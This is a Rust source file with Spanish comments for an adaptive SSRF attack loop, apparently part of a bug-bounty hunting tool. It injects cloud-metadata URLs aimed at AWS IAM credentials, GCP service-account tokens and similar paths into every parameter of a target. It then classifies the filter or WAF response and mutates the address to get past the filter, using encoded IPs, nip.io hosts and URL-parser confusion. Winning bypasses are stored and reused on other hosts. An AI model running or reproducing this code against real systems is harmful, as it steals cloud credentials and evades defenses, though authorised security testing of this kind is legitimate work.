//! ARNm — el bucle ADAPTATIVO de descubrimiento (analogía de Juan, 2026-08-23).
//!
//! «Piensa como opera un hacker: no es estático, es metódico y calculador, varía
//! los ataques, lo hace con precisión y se adapta». Este módulo ES ese método,
//! no un catálogo. Un hardcode de sondas por plataforma sería tan estático como
//! nuclei, solo que para esa plataforma; lo que no envejece es el BUCLE:
//!
//!   observar → clasificar el bloqueo → elegir la contra-mutación que lo vence →
//!   variar con precisión → confirmar por oráculo → recordar la secuencia.
//!
//! Primera encarnación: SSRF a metadata de nube. El `ssrf.rs` actual lleva una
//! LISTA FIJA de payloads (`169.254.169.254`, `metadata.google.internal`…); un
//! objetivo que filtre esa IP los bloquea todos y sale seco — la debilidad
//! estática exacta. El hacker, ante el filtro, no repite: CODIFICA la IP
//! (decimal, hex, octal, IPv6-mapeada), usa hosts alternos, encadena
//! redirecciones. Aquí eso son MUTADORES, y la clase de bloqueo observada elige
//! CUÁL aplicar (precisión, no rociar todo).
//!
//! El oráculo de confirmación NO se reinventa: se reusa
//! `ssrf::detectar_metadata_exfiltrada`, endurecido contra reflexión en la
//! revisión de seguridad del 2026-08-23 (un token que aparece en lo inyectado NO
//! cuenta). Una confirmación por contenido es ejecución real → alimenta
//! `secuencias` con el testigo `OraculoConfirmado`. El punto dulce del virus
//! —vocabulario de mutación ∩ oráculo con verdad-terreno— vive aquí, no en autz.

use std::collections::BTreeMap;
use std::net::Ipv4Addr;

use sqlx::SqlitePool;

use crate::error::Result;
use crate::protection::Guard;
use crate::secuencias::{self, Mutacion, OraculoConfirmado};

/// La IP de metadata de enlace-local, común a AWS/GCP/Azure/DO. Es el objetivo
/// que los filtros de SSRF bloquean por cadena literal — y por tanto lo que hay
/// que codificar de otra forma.
const IP_METADATA: Ipv4Addr = Ipv4Addr::new(169, 254, 169, 254);

/// Un objetivo de metadata: la IP de metadata del proveedor y la ruta a leer (GET
/// idempotente, «sin daño»). Antes el host era SIEMPRE la IP de AWS
/// (169.254.169.254); ahora cada objetivo trae su IP, para cubrir los proveedores
/// que viven en OTRA IP (Alibaba 100.100.100.200, Oracle 192.0.0.192).
#[derive(Debug, Clone)]
pub struct Objetivo {
    pub ip: Ipv4Addr,
    pub ruta: String,
}

/// IPs de metadata por proveedor. AWS/GCP/Azure/DO comparten la link-local
/// 169.254.169.254; Alibaba y Oracle tienen la suya.
const IP_ALIBABA: Ipv4Addr = Ipv4Addr::new(100, 100, 100, 200);
const IP_ORACLE: Ipv4Addr = Ipv4Addr::new(192, 0, 0, 192);

/// Tope de objetivos EXTRA que se cargan de nuclei por fase. El literal de cada
/// objetivo cuesta una sonda por endpoint; la diversidad de rutas/IP de metadata
/// se satura pronto y no conviene inflar el presupuesto anti-baneo.
const SSRF_NUCLEI_CAP: usize = 40;

/// Sondas que el barrido literal RESERVA para la adaptación (memoria/biblioteca/
/// Fase 2). Sin esta reserva, un catálogo de objetivos grande estrangularía el
/// motor adaptativo bajo un `tope` fijo (revisión 2026-08-27).
const RESERVA_ADAPTACION: u32 = 6;

/// El catálogo BASE de objetivos de metadata (multi-nube). Es la línea de fondo
/// hand-crafted; `nuclei_moldes::cargar_objetivos_metadata` lo AMPLÍA en caliente
/// con lo que curó el corpus de nuclei (la inversión), igual que XSS.
pub fn objetivos_base() -> Vec<Objetivo> {
    let o = |ip, ruta: &str| Objetivo { ip, ruta: ruta.to_string() };
    vec![
        o(IP_METADATA, "/latest/meta-data/iam/security-credentials/"), // AWS
        o(IP_METADATA, "/computeMetadata/v1/instance/service-accounts/default/token"), // GCP
        o(IP_METADATA, "/metadata/instance?api-version=2021-02-01"), // Azure
        o(IP_METADATA, "/metadata/v1.json"), // DigitalOcean
        o(IP_ALIBABA, "/latest/meta-data/ram/security-credentials/"), // Alibaba Cloud
        o(IP_ORACLE, "/opc/v2/instance/"), // Oracle Cloud (OCI)
    ]
}

/// Las FAMILIAS de mutación: los "trucos" que el hacker varía contra un filtro.
/// Cada una ataca una forma distinta de filtrar.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Familia {
    /// Literal, sin mutar: la línea base. Si pasa, no hay filtro que vencer.
    Literal,
    /// La IP en otra base (decimal/hex/octal/IPv6-mapeada): vence al filtro que
    /// casa la cadena `169.254.169.254`.
    CodificacionIp,
    /// Nombres que resuelven a la IP (`metadata.google.internal`, sufijo de
    /// resolución comodín): vence al filtro que solo bloquea la IP numérica.
    HostAlterno,
    /// Confusión del parser de URL (credenciales embebidas, fragmento): vence al
    /// filtro que valida el host mirando el sitio equivocado de la URL.
    ConfusionParser,
}

impl Familia {
    pub fn nombre(self) -> &'static str {
        match self {
            Familia::Literal => "literal",
            Familia::CodificacionIp => "codificacion-ip",
            Familia::HostAlterno => "host-alterno",
            Familia::ConfusionParser => "confusion-parser",
        }
    }

    /// El inverso de `nombre`, para reconstruir la familia de una mutación
    /// recordada. Desconocida → `Literal` (la más inocua: un valor corrupto en la
    /// memoria no debe fabricar una familia agresiva).
    pub fn desde_nombre(s: &str) -> Familia {
        match s {
            "codificacion-ip" => Familia::CodificacionIp,
            "host-alterno" => Familia::HostAlterno,
            "confusion-parser" => Familia::ConfusionParser,
            _ => Familia::Literal,
        }
    }
}

/// Acceso a la memoria adaptativa durante la caza: el pool y el host víctima.
/// Cuando se pasa, el bucle LIDERA con las secuencias recordadas para ese host y
/// huella (la vía rápida del virus que recuerda) antes de la búsqueda genérica.
pub struct Memoria<'a> {
    pub pool: &'a SqlitePool,
    pub host: &'a str,
    /// El programa H1/Intigriti del host — lo exige `registrar_refutada` al escribir
    /// una variante fracasada a la biblioteca (la reforma 2026-08-26). Los lectores
    /// (`recuperar`, `biblioteca`) no lo usan; el escritor sí.
    pub program_name: &'a str,
    /// Enforcement de la memoria NEGATIVA (`exclusiones`): `Some(ttl_secs)` = SALTAR
    /// la búsqueda cara cuando un veredicto vigente bajo la huella actual dice que el
    /// arsenal está agotado —y ese veredicto no ha caducado por antigüedad (TTL)—;
    /// `None` = apagado (la memoria positiva sigue igual y no se salta nada). Un
    /// solo campo para no permitir estados inconsistentes (directiva 32): el TTL es
    /// un parámetro DE enforcement, no existe sin él. Despliegue medido vía
    /// `NEXUS_EXCLUSIONES_ENFORCE` + `NEXUS_EXCLUSIONES_TTL_DIAS`.
    pub enforce_ttl: Option<i64>,
}

/// La clase de bloqueo OBSERVADA: el "cálculo" del hacker sobre por qué nos
/// frenó. Determina qué contra-mutación tiene sentido (no se rocía todo).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClaseBloqueo {
    /// 400/403 con señal de que el HOST fue rechazado por su valor (filtro de
    /// destino): la IP/host está en una lista negra. Contra-mutación: recodificar.
    FiltroDestino,
    /// Señal de WAF genérico (challenge, 406, "request blocked"): puede ceder a
    /// ofuscación distinta, pero también puede ser muro. Contra-mutación cauta.
    Waf,
    /// 2xx pero SIN metadata (la petición salió pero no llegó a la IP interna, o
    /// el SSRF no existe): variar el destino no ayuda; es señal de agotamiento.
    SinExfiltracion,
    /// La petición ni siquiera se cursó (error de red del lado del objetivo).
    Rechazo,
}

/// La contra-mutación METÓDICA: qué familias vencen a qué clase de bloqueo. Es la
/// precisión —no probar host-alterno contra un WAF que no filtra por host—.
pub fn contramutaciones(clase: ClaseBloqueo) -> &'static [Familia] {
    match clase {
        // Filtro por destino: el host está vetado por su forma → cambiar su forma.
        ClaseBloqueo::FiltroDestino => {
            &[Familia::CodificacionIp, Familia::HostAlterno, Familia::ConfusionParser]
        }
        // WAF: la ofuscación de parser a veces cuela; la codificación de IP no
        // siempre ayuda contra un WAF que inspecciona el contenido, pero se
        // intenta la de menor ruido primero.
        ClaseBloqueo::Waf => &[Familia::ConfusionParser, Familia::CodificacionIp],
        // Sin exfiltración: no hay filtro que vencer variando el destino. Se para.
        ClaseBloqueo::SinExfiltracion => &[],
        // Rechazo de red: reintentar con otra forma de destino por si es el host.
        ClaseBloqueo::Rechazo => &[Familia::CodificacionIp, Familia::HostAlterno],
    }
}

/// Clasifica la respuesta a una sonda (status, cuerpo). PURO. `exfiltro` = si el
/// oráculo de contenido ya confirmó (en cuyo caso no es bloqueo, es acierto y no
/// se llama a esto).
pub fn clasificar_bloqueo(status: u16, cuerpo: &str) -> ClaseBloqueo {
    let c = cuerpo.to_ascii_lowercase();
    // Señales de WAF/anti-bot genérico.
    if status == 406
        || c.contains("request blocked")
        || c.contains("access denied by")
        || c.contains("cloudflare")
        || c.contains("just a moment")
    {
        return ClaseBloqueo::Waf;
    }
    // Rechazo del destino por su valor: el clásico filtro anti-SSRF.
    if matches!(status, 400 | 403)
        && (c.contains("invalid url")
            || c.contains("blocked host")
            || c.contains("not allowed")
            || c.contains("forbidden host")
            || c.contains("internal address")
            || c.contains("private ip")
            || c.contains("ssrf"))
    {
        return ClaseBloqueo::FiltroDestino;
    }
    // 400/403 sin pista de por qué: se trata como filtro de destino (la hipótesis
    // más productiva para un endpoint que acepta URLs), NO se descarta.
    if matches!(status, 400 | 403) {
        return ClaseBloqueo::FiltroDestino;
    }
    // 2xx sin metadata: la petición salió pero no exfiltró.
    if (200..300).contains(&status) {
        return ClaseBloqueo::SinExfiltracion;
    }
    ClaseBloqueo::Rechazo
}

/// La huella del FILTRO del objetivo: su postura defensiva ante SSRF, para llavear
/// la secuencia (directiva 31). Cadena canónica legible.
pub fn huella_filtro(clase: ClaseBloqueo) -> String {
    let etiqueta = match clase {
        ClaseBloqueo::FiltroDestino => "destino",
        ClaseBloqueo::Waf => "waf",
        ClaseBloqueo::SinExfiltracion => "abierto",
        ClaseBloqueo::Rechazo => "rechazo",
    };
    format!("ssrf-filtro={etiqueta}")
}

// ---- Mutadores: PUROS. Generan variantes del DESTINO, no de la ruta. ----

/// La IPv4 en todas sus codificaciones equivalentes. Cada una resuelve a la MISMA
/// dirección: es la propiedad que las pruebas verifican (una variante que apunte
/// a otra IP sería un fallo grave — se le enviaría tráfico a un tercero).
pub fn variantes_ipv4(ip: Ipv4Addr) -> Vec<String> {
    let n = u32::from(ip);
    let [a, b, c, d] = ip.octets();
    vec![
        format!("{n}"),                              // decimal entero: 2852039166
        format!("0x{n:08x}"),                        // hex entero: 0xa9fea9fe
        format!("0{:o}.0{:o}.0{:o}.0{:o}", a, b, c, d), // octal por octeto
        format!("[::ffff:{a}.{b}.{c}.{d}]"),         // IPv6-mapeada (dotted)
        format!("[::ffff:{:x}{:02x}:{:x}{:02x}]", a, b, c, d), // IPv6-mapeada (hex)
    ]
}

/// Hosts alternos que resuelven a la IP de metadata: el nombre canónico de GCP y
/// los servicios de resolución comodín (`nip.io`) que mapean una IP embebida en
/// el nombre. No inventa dominios: son técnicas públicas y estables.
pub fn variantes_host(ip: Ipv4Addr) -> Vec<String> {
    let [a, b, c, d] = ip.octets();
    vec![
        "metadata.google.internal".to_string(),
        format!("{a}.{b}.{c}.{d}.nip.io"),
        format!("{a}-{b}-{c}-{d}.nip.io"),
    ]
}

/// Confusión del parser: técnicas donde el host REAL no es el que un validador
/// ingenuo lee. `usuario@host` (el validador lee el usuario), `#@host` (fragmento).
pub fn variantes_confusion(ip: Ipv4Addr) -> Vec<String> {
    // `example.com` es dominio reservado por IANA: sin tokens de metadata, no
    // atacable — un parser ingenuo que fuera ahí no confirma. El host REAL tras
    // el `@`/`#` es la IP de metadata. (Se retiró la variante `%2523@`: el
    // `append_pair` de la inyección re-codifica el `%` y la variante no
    // decodificaba al `#` pretendido — no atacaba lo que decía.)
    let real = ip.to_string();
    vec![
        format!("permitido.example.com@{real}"),
        format!("permitido.example.com#@{real}"),
    ]
}

/// Genera las variantes de DESTINO para una familia. El destino se compone luego
/// con la ruta y el esquema para formar la URL de metadata mutada.
fn destinos(familia: Familia, ip: Ipv4Addr) -> Vec<String> {
    match familia {
        Familia::Literal => vec![ip.to_string()],
        Familia::CodificacionIp => variantes_ipv4(ip),
        Familia::HostAlterno => variantes_host(ip),
        Familia::ConfusionParser => variantes_confusion(ip),
    }
}

/// Compone la URL de metadata mutada: `http://{destino}{ruta}`.
pub fn componer(destino: &str, ruta: &str) -> String {
    format!("http://{destino}{ruta}")
}

// ---- El transporte, inyectable para poder probar el bucle sin salir a la red. ----

/// La forma de cursar una sonda. La implementación real usa `reqwest`; las
/// pruebas usan un objetivo sintético con un filtro conocido. Devuelve
/// `(status, cuerpo)` o `None` si la petición no se pudo cursar.
// Solo se usa con despacho estático (`impl Sonda`) dentro del crate; no cruza
// hilos ni necesita cota `Send` explícita, así que `async fn` en el trait es el
// desazúcar correcto (la propia nota del lint autoriza suprimirlo en ese caso).
#[allow(async_fn_in_trait)]
pub trait Sonda {
    async fn pedir(&self, url: &str) -> Option<(u16, String)>;
}

/// Sonda real sobre HTTP: inyecta el payload (una URL de metadata) en CADA
/// parámetro del endpoint objetivo —reusa `ssrf::inyectar_en_parametros`, el
/// mismo camino que la SSRF in-band— y devuelve la respuesta que exfiltró, o la
/// última observada (para clasificar el filtro). El endpoint es quien busca la
/// URL por nosotros; su cuerpo es lo que se examina.
pub struct SondaHttp<'a> {
    pub cliente: &'a reqwest::Client,
    pub url_objetivo: String,
}

impl Sonda for SondaHttp<'_> {
    async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
        let inyecciones = crate::ssrf::inyectar_en_parametros(&self.url_objetivo, payload);
        if inyecciones.is_empty() {
            return None;
        }
        let mut ultima = None;
        for iny in inyecciones {
            if let Ok(r) = self.cliente.get(&iny).send().await {
                let status = r.status().as_u16();
                if let Ok(cuerpo) = r.text().await {
                    // Si ESTE punto de inyección exfiltró, gana: se devuelve.
                    if crate::ssrf::detectar_metadata_exfiltrada(&cuerpo, payload).is_some() {
                        return Some((status, cuerpo));
                    }
                    ultima = Some((status, cuerpo));
                }
            }
        }
        ultima
    }
}

/// El resultado del bucle adaptativo contra un endpoint.
#[derive(Debug)]
pub enum Resultado {
    /// SSRF confirmada por contenido: la mutación ganadora, su familia, el
    /// proveedor de metadata, cuántas sondas costó y la huella del filtro vencido.
    Confirmado {
        payload_ganador: String,
        familia: Familia,
        proveedor: &'static str,
        intentos: u32,
        huella: String,
    },
    /// Se adaptó y aun así no cedió: qué clase de bloqueo lo detuvo y cuántas
    /// sondas se probaron. Es un NEGATIVO con positivo de control (directiva 30):
    /// dice que el camino se recorrió y por qué calló, distinto de «no corrió».
    ///
    /// `clase_final` es DIAGNÓSTICA: puede haber derivado a `SinExfiltracion` si una
    /// mutación venció el filtro pero no halló metadata. `huella` es la del filtro
    /// de la FASE 1 (ESTABLE, no derivada) — la clave con que la memoria negativa
    /// debe registrar, para que el reader del enforcement (que lee la huella de
    /// fase 1) la reencuentre. Sin esta separación, un Seco derivado se guardaba
    /// bajo `abierto` y se releía bajo `destino` y nunca casaba (obs. de la
    /// revisión, 2026-08-24); es el mismo motivo por el que `Confirmado` guarda la
    /// huella de fase 1 a propósito.
    Seco { clase_final: ClaseBloqueo, huella: String, intentos: u32 },
    /// DETENIDO por protección anti-baneo: el objetivo nos frenó (429/503) o se
    /// acumularon errores de red, y `should_pause` cortó para proteger la IP
    /// COMPARTIDA del VPS. Distinto de `Seco` (agotó las mutaciones) — «paré para
    /// proteger» y «no encontré» no se ven igual (directiva 30).
    Detenido { motivo: &'static str, intentos: u32 },
    /// SALTADO por la memoria NEGATIVA: tras el sondeo literal (que establece la
    /// huella actual), un veredicto vigente bajo ESA MISMA huella dijo que el
    /// arsenal estático no cede aquí, así que NO se corrió la búsqueda genérica
    /// cara. Distinto de `Seco` (directiva 30): «ya sabíamos que no» ≠ «lo probé y
    /// no encontré». `intentos` cuenta solo las sondas literales que sí se hicieron
    /// para confirmar que la huella sigue vigente.
    Saltado { causa: crate::exclusiones::Causa, huella: String, intentos: u32 },
}

/// El resultado de una sonda, ya pasada por el `Guard` anti-baneo.
enum Sondeo {
    /// Respuesta normal (éxito registrado en el guard, y ya paceada).
    Respuesta(u16, String),
    /// 429/503: el objetivo nos frena. Backoff ya aplicado; seguir con la siguiente.
    Baneado,
    /// La petición no se cursó (error de red del lado del objetivo).
    SinRed,
    /// `should_pause`: hay que PARAR toda la fase para proteger la IP compartida.
    Detener(&'static str),
}

/// Cursa UNA sonda con la disciplina anti-baneo del `Guard` (la misma de
/// `fase_bypass`): un 429/503 es el «para» explícito → backoff exponencial con
/// jitter, y si se acumulan, `should_pause` corta la fase. Un 403 NO es baneo —
/// es la respuesta ESPERADA de un filtro que estamos mutando para vencer, así que
/// no cuenta como fallo—. Pacea entre sondas (`pausa`) para no ráfaga.
async fn probar_sonda<S: Sonda, R: FnMut() -> f64>(
    sonda: &S,
    payload: &str,
    guard: &mut Guard,
    pausa: u64,
    rng: &mut R,
) -> Sondeo {
    match sonda.pedir(payload).await {
        Some((status, cuerpo)) => {
            if crate::protection::es_senal_de_baneo(status) {
                let espera = guard.record_failure();
                if guard.should_pause() {
                    return Sondeo::Detener(
                        "429/503 repetidos — el objetivo nos frena; paro para proteger la IP compartida",
                    );
                }
                tokio::time::sleep(guard.cooldown(espera, rng())).await;
                Sondeo::Baneado
            } else {
                guard.record_success();
                if pausa > 0 {
                    tokio::time::sleep(guard.cooldown(pausa, rng())).await;
                }
                Sondeo::Respuesta(status, cuerpo)
            }
        }
        None => {
            guard.record_network_error();
            if guard.should_pause() {
                Sondeo::Detener("errores de red repetidos; paro para proteger la IP compartida")
            } else {
                Sondeo::SinRed
            }
        }
    }
}

/// EL BUCLE. Contra un endpoint que acepta una URL, intenta leer metadata de
/// nube: prueba el literal, observa el bloqueo, elige la contra-mutación METÓDICA
/// para esa clase, varía con precisión, y confirma por contenido. Adaptativo: la
/// respuesta al literal decide qué familias valen la pena. Acotado por `tope` de
/// sondas (protege la IP compartida del VPS; el hacker es preciso, no ruidoso).
pub async fn cazar_ssrf(
    sonda: &impl Sonda,
    tope: u32,
    memoria: Option<Memoria<'_>>,
    guard: &mut Guard,
    pausa_secs: u64,
    rng: &mut impl FnMut() -> f64,
    objetivos: &[Objetivo],
) -> Resultado {
    let mut intentos = 0u32;
    // Fase 1: el literal. Su respuesta es el "casing the joint": nos dice qué
    // filtro hay y, por tanto, qué mutaciones tienen sentido.
    let mut clase_observada = ClaseBloqueo::Rechazo;
    // El barrido literal RESERVA presupuesto para la adaptación: con un catálogo
    // multi-nube grande (base + nuclei), si la fase 1 gastara todo `tope` en
    // literales, la memoria/biblioteca/Fase 2 —el valor de arnm— nunca correrían
    // contra un host que filtra (revisión 2026-08-27; modo de fallo de
    // `presupuesto-estrangula-fase`). Los objetivos van con la base primero, así que
    // el corte cae sobre los cargados de nuclei, no sobre los proveedores base.
    let limite_literal = tope.saturating_sub(RESERVA_ADAPTACION);
    for obj in objetivos {
        if intentos >= tope {
            return Resultado::Seco { clase_final: clase_observada, huella: huella_filtro(clase_observada), intentos };
        }
        if intentos >= limite_literal {
            break; // reserva agotada para el barrido: pasa a la adaptación
        }
        let literal = componer(&obj.ip.to_string(), &obj.ruta);
        intentos += 1;
        match probar_sonda(sonda, &literal, guard, pausa_secs, rng).await {
            Sondeo::Detener(motivo) => return Resultado::Detenido { motivo, intentos },
            Sondeo::Baneado => continue,
            Sondeo::SinRed => {
                clase_observada = ClaseBloqueo::Rechazo;
            }
            Sondeo::Respuesta(status, cuerpo) => {
                if let Some(prov) = crate::ssrf::detectar_metadata_exfiltrada(&cuerpo, &literal) {
                    // Sin filtro: el literal ya exfiltró.
                    return Resultado::Confirmado {
                        payload_ganador: literal,
                        familia: Familia::Literal,
                        proveedor: prov,
                        intentos,
                        huella: huella_filtro(ClaseBloqueo::SinExfiltracion),
                    };
                }
                clase_observada = clasificar_bloqueo(status, &cuerpo);
            }
        }
    }

    let huella = huella_filtro(clase_observada);

    // Fase 1.5: MEMORIA. El virus que recuerda: si ya vencimos ESTE filtro (misma
    // huella) contra ESTE host, lidera con la mutación que funcionó, antes de la
    // búsqueda genérica. `recuperar` además caduca lo que dejó de valer si el host
    // cambió su defensa (huella distinta) — la adaptación al endurecimiento.
    if let Some(mem) = &memoria {
        if let Ok(recordadas) =
            secuencias::recuperar(mem.pool, mem.host, "ssrf-metadata", &huella).await
        {
            for sec in recordadas {
                if intentos >= tope {
                    return Resultado::Seco { clase_final: clase_observada, huella: huella.clone(), intentos };
                }
                let Some(payload) = sec.mutacion.parametros.get("payload").cloned() else {
                    continue;
                };
                intentos += 1;
                match probar_sonda(sonda, &payload, guard, pausa_secs, rng).await {
                    Sondeo::Detener(motivo) => return Resultado::Detenido { motivo, intentos },
                    Sondeo::Baneado | Sondeo::SinRed => continue,
                    Sondeo::Respuesta(_, cuerpo) => {
                        if let Some(prov) =
                            crate::ssrf::detectar_metadata_exfiltrada(&cuerpo, &payload)
                        {
                            return Resultado::Confirmado {
                                payload_ganador: payload,
                                familia: Familia::desde_nombre(&sec.mutacion.tecnica),
                                proveedor: prov,
                                intentos,
                                huella,
                            };
                        }
                    }
                }
            }
        }
    }

    // Fase 1.7: BIBLIOTECA CROSS-HOST (reforma 2026-08-26, diseño de Juan). Antes
    // de GENERAR variantes nuevas (Fase 2, cara y con riesgo brain), RECICLA las que
    // funcionaron o se probaron en OTROS hosts de esta familia y que este host aún
    // no ha intentado. La economía del modelo: re-lanzar lo acumulado es barato;
    // generar es caro. Cada fracaso GENUINO se registra para que la variante siga
    // acumulándose y se recicle en el próximo sitio. `limite = tope` acota el
    // reciclaje (barandilla anti-baneo: nunca un corpus ilimitado de un tirón).
    if let Some(mem) = &memoria {
        if let Ok(candidatas) =
            secuencias::biblioteca(mem.pool, "ssrf-metadata", mem.host, i64::from(tope)).await
        {
            for cand in candidatas {
                if intentos >= tope {
                    return Resultado::Seco { clase_final: clase_observada, huella: huella.clone(), intentos };
                }
                let Some(payload) = cand.mutacion.parametros.get("payload").cloned() else {
                    continue;
                };
                intentos += 1;
                match probar_sonda(sonda, &payload, guard, pausa_secs, rng).await {
                    Sondeo::Detener(motivo) => return Resultado::Detenido { motivo, intentos },
                    // Baneado/SinRed NO es refutación: la variante no se probó justo
                    // (fallo de infra, no victoria de la defensa). No se registra.
                    Sondeo::Baneado | Sondeo::SinRed => continue,
                    Sondeo::Respuesta(status, cuerpo) => {
                        if let Some(prov) =
                            crate::ssrf::detectar_metadata_exfiltrada(&cuerpo, &payload)
                        {
                            return Resultado::Confirmado {
                                payload_ganador: payload,
                                familia: Familia::desde_nombre(&cand.mutacion.tecnica),
                                proveedor: prov,
                                intentos,
                                huella,
                            };
                        }
                        // Refutación GENUINA = la app SIRVIÓ la petición (status < 400)
                        // y no exfiltró. Un 4xx/5xx es BLOQUEO/error, no una prueba
                        // justa de la variante (la SSRF ni se intentó server-side); y
                        // un muro de 403 lo maneja el Guard/exclusiones aguas arriba,
                        // saltando el host entero — registrar el bloqueo aquí solo
                        // ensuciaría la biblioteca con ruido de postura. Solo el
                        // fracaso servido se recicla. No-fatal (dir. 20).
                        // Camino A (Juan 2026-08-26): servida (status < 400) →
                        // refutada; amurallada (4xx/5xx del WAF) → amurallada, MARCADA,
                        // para reciclar cross-host por debajo de lo servido. Baneado/
                        // SinRed ya hicieron `continue` arriba: no es prueba justa.
                        let reg = if status < 400 {
                            secuencias::registrar_refutada(
                                mem.pool, mem.program_name, mem.host, &huella, &cand.mutacion,
                            )
                            .await
                        } else {
                            secuencias::registrar_amurallada(
                                mem.pool, mem.program_name, mem.host, &huella, &cand.mutacion,
                            )
                            .await
                        };
                        if let Err(e) = reg {
                            tracing::warn!("biblioteca: no pude registrar variante fallida: {e}");
                        }
                    }
                }
            }
        }
    }

    // Fase 1.6: MEMORIA NEGATIVA (enforcement, opt-in). La memoria POSITIVA de
    // arriba ya tuvo su oportunidad —si había una mutación ganadora vigente, ya
    // habríamos confirmado y salido—. Si NO la había y bajo ESTA MISMA huella hay
    // un veredicto que dice que el arsenal genérico se agotó (o que no hay
    // superficie), NO gastamos la búsqueda cara de la fase 2: es re-probar lo que
    // ya sabemos inmune. La huella se computó con `huella_filtro` (misma que el
    // writer y que la memoria positiva), así que la comparación de `accion_para`
    // discrimina. Se hace DESPUÉS del sondeo literal a propósito: esos ~4 tiros
    // baratos son los que confirman que la huella SIGUE vigente; si el objetivo
    // cambió su postura, la huella difiere, el veredicto caduca y NO se salta.
    if let Some(mem) = &memoria {
        if let Some(ttl_secs) = mem.enforce_ttl {
            match crate::exclusiones::accion_para(mem.pool, mem.host, "ssrf", &huella, ttl_secs).await {
                Ok(crate::exclusiones::Accion::Saltar) => {
                    if let Ok(Some((causa, _))) =
                        crate::exclusiones::consultar(mem.pool, mem.host, "ssrf").await
                    {
                        return Resultado::Saltado { causa, huella, intentos };
                    }
                }
                Ok(crate::exclusiones::Accion::EncolarGeneracion) => {
                    // Hoy no hay generador: EncolarGeneracion se comporta como
                    // Saltar (no repetir el arsenal), y el veredicto persistido
                    // `MetodosAgotados` ES la cola de generación hasta que exista.
                    return Resultado::Saltado {
                        causa: crate::exclusiones::Causa::MetodosAgotados,
                        huella,
                        intentos,
                    };
                }
                // Reintentar → seguir a la fase 2 con normalidad. Un Err de la
                // consulta NO bloquea la caza (fail-open, directiva 20): se corre
                // la fase como si no hubiera memoria negativa.
                Ok(crate::exclusiones::Accion::Reintentar { .. }) | Err(_) => {}
            }
        }
    }

    // Fase 2: adaptación. Elige las familias que vencen a la clase observada y
    // varía. Precisión: solo esas familias, en orden.
    let familias = contramutaciones(clase_observada);
    for &familia in familias {
        for obj in objetivos {
            for destino in destinos(familia, obj.ip) {
                if intentos >= tope {
                    return Resultado::Seco { clase_final: clase_observada, huella: huella.clone(), intentos };
                }
                let payload = componer(&destino, &obj.ruta);
                intentos += 1;
                let (status, cuerpo) =
                    match probar_sonda(sonda, &payload, guard, pausa_secs, rng).await {
                        Sondeo::Detener(motivo) => {
                            return Resultado::Detenido { motivo, intentos }
                        }
                        Sondeo::Baneado | Sondeo::SinRed => continue,
                        Sondeo::Respuesta(status, cuerpo) => (status, cuerpo),
                    };
                if let Some(prov) = crate::ssrf::detectar_metadata_exfiltrada(&cuerpo, &payload) {
                    return Resultado::Confirmado {
                        payload_ganador: payload,
                        familia,
                        proveedor: prov,
                        intentos,
                        // La huella del FILTRO observado tras el literal
                        // (estable), NO la de `clase_observada`, que puede
                        // haber derivado a SinExfiltracion por una variante
                        // intermedia — guardar bajo la huella derivada haría
                        // que el próximo ciclo busque bajo otra y la memoria
                        // nunca acierte (falso negativo silencioso).
                        huella: huella.clone(),
                    };
                }
                // Refutación GENUINA de una variante GENERADA = la app SIRVIÓ la
                // petición (status < 400) y no exfiltró. Entra a la biblioteca para
                // reciclarse en OTROS hosts — el corazón de la reforma (Juan
                // 2026-08-26): el fracaso servido aquí es un candidato allá. Un
                // 4xx/5xx (bloqueo) NO se registra: no es prueba justa, y el muro lo
                // maneja el Guard/exclusiones. No-fatal (dir. 20).
                // Camino A (Juan 2026-08-26): la variante GENERADA que la app sirvió
                // (status < 400) sin exfiltrar → refutada; la que el WAF amuralló
                // (4xx/5xx) → amurallada, MARCADA. Antes solo entraba la servida, y
                // sobre objetivos maduros TODA variante se amuralla → la biblioteca
                // nunca se sembraba (medido: 0 filas). Baneado/SinRed ya hicieron
                // `continue`: solo llegamos aquí con una respuesta real del objetivo.
                if let Some(mem) = &memoria {
                    let mutada = a_mutacion(familia, &payload);
                    let reg = if status < 400 {
                        secuencias::registrar_refutada(
                            mem.pool, mem.program_name, mem.host, &huella, &mutada,
                        )
                        .await
                    } else {
                        secuencias::registrar_amurallada(
                            mem.pool, mem.program_name, mem.host, &huella, &mutada,
                        )
                        .await
                    };
                    if let Err(e) = reg {
                        tracing::warn!("arnm fase 2: no pude registrar variante fallida: {e}");
                    }
                }
                // Adaptación fina: si esta variante cambió la clase de bloqueo
                // (p. ej. de FiltroDestino a SinExfiltracion), lo registra para
                // el veredicto seco.
                let nueva = clasificar_bloqueo(status, &cuerpo);
                if nueva == ClaseBloqueo::SinExfiltracion {
                    clase_observada = nueva;
                }
            }
        }
    }
    Resultado::Seco { clase_final: clase_observada, huella, intentos }
}

/// Convierte un acierto en una `Mutacion` para la memoria: la familia y el payload
/// ganador. Estructural, no texto libre.
pub fn a_mutacion(familia: Familia, payload_ganador: &str) -> Mutacion {
    let mut p = BTreeMap::new();
    p.insert("payload".to_string(), payload_ganador.to_string());
    Mutacion {
        familia: "ssrf-metadata".to_string(),
        tecnica: familia.nombre().to_string(),
        parametros: p,
    }
}

/// Caza y, si confirma, GUARDA la secuencia ganadora en la memoria adaptativa.
/// El testigo `OraculoConfirmado` se construye solo porque la exfiltración por
/// contenido ES ejecución confirmada — sin acierto no hay testigo ni escritura.
#[allow(clippy::too_many_arguments)] // caza + memoria + anti-baneo: cada uno es un eje real
pub async fn cazar_y_recordar(
    pool: &SqlitePool,
    sonda: &impl Sonda,
    program: &str,
    host: &str,
    tope: u32,
    guard: &mut Guard,
    pausa_secs: u64,
    rng: &mut impl FnMut() -> f64,
    objetivos: &[Objetivo],
) -> Result<Resultado> {
    // cazar_y_recordar es la vía que SOLO ejercita la memoria positiva (guardar);
    // el enforcement negativo se prueba por `procesar_url`, así que aquí va None.
    let r = cazar_ssrf(sonda, tope, Some(Memoria { pool, host, program_name: program, enforce_ttl: None }), guard, pausa_secs, rng, objetivos).await;
    if let Resultado::Confirmado { payload_ganador, familia, proveedor, huella, .. } = &r {
        // Exfiltración por contenido = ejecución real (mismo listón que el
        // auto-envío). El testigo existe por eso.
        let testigo = OraculoConfirmado::desde_ejecucion(true)
            .expect("exfiltración por contenido es ejecución confirmada");
        let mutacion = a_mutacion(*familia, payload_ganador);
        let evidencia = format!("SSRF a metadata {proveedor} vía {} confirmada por contenido", familia.nombre());
        secuencias::guardar(
            pool, &testigo, program, host, huella, &mutacion, Some(&evidencia), None,
        )
        .await?;
    }
    Ok(r)
}

